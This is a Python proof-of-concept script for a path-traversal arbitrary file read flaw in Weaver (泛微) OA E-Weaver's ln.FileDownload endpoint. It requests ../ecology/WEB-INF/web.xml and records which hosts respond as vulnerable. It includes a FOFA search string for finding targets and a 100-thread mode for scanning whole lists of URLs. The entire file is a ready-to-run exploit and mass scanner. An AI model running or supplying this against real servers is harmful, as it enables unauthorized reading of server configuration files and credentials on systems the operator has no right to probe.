#-*- coding: utf-8 -*-
import argparse,sys,requests,re
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool
from rich.console import Console

def banner():
    test = """
███╗   ███╗██╗██╗     ███████╗███████╗██╗ ██████╗ ██╗  ██╗████████╗██╗   ██╗██████╗ ███╗   ██╗
████╗ ████║██║██║     ██╔════╝██╔════╝██║██╔════╝ ██║  ██║╚══██╔══╝██║   ██║██╔══██╗████╗  ██║
██╔████╔██║██║██║     █████╗  ███████╗██║██║  ███╗███████║   ██║   ██║   ██║██████╔╝██╔██╗ ██║
██║╚██╔╝██║██║██║     ██╔══╝  ╚════██║██║██║   ██║██╔══██║   ██║   ╚██╗ ██╔╝██╔═══╝ ██║╚██╗██║
██║ ╚═╝ ██║██║███████╗███████╗███████║██║╚██████╔╝██║  ██║   ██║    ╚████╔╝ ██║     ██║ ╚████║
╚═╝     ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝     ╚═══╝  ╚═╝     ╚═╝  ╚═══╝                                                                                           
                                        tag: 泛微OA E-Weaver ln.FileDownload 任意文件读取漏洞 poc  
                                                            @version: 1.0.0     @author: jcad                                                                                         
"""
    print(test)

console = Console()

# FOFA: app="泛微-协同办公OA"

# proxies = {
#     "http":"127.0.0.1:8080",
#     "https":"127.0.0.1:8080"
# }

def poc(target):
    url = target+"/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml"
    headers = {"Sec-Ch-Ua": "\"Chromium\";v=\"109\", \"Not_A Brand\";v=\"99\"", "Sec-Ch-Ua-Mobile": "?0",
               "Sec-Ch-Ua-Platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
               "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1",
               "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9",
               "Connection": "close"}
    a = '?xml version="1.0" encoding="UTF-8"?'
    try:
        res = requests.get(url,headers=headers,verify=False,timeout=5)
        if res.status_code == 200 and a in res.text:
            console.print(f"[+] {target} is vulnable!", style="bold green")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target + "\n")
        else:
            console.print(f"[-] {target} is not vulnable",style="bold red")
    except:
        console.print(f"[*] {target} server error",style="bold yellow")
def main():
    banner()
    parser = argparse.ArgumentParser(description='泛微OA E-Weaver ln.FileDownload 任意文件读取漏洞')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,"r",encoding="utf8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100) # 自己指定的线程数
        mp.map(poc, url_list) #printNumber 函数 target 目标列表
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()